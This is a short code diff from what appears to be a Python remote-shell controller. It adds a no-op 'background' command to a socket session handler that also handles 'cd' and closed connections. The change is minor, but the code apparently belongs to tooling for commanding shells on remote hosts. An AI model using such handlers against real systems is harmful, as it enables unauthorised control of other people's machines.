@@ -33,6 +33,8 @@ def session_handler():
                     print('[+] Connection closed from remote host')
                     sock.close()
                     break
+                elif message.lower() == 'background':
+                    pass
                 elif message.split(" ")[0] == 'cd':
                     try:
                         directory = str(message.split(" ")[1])
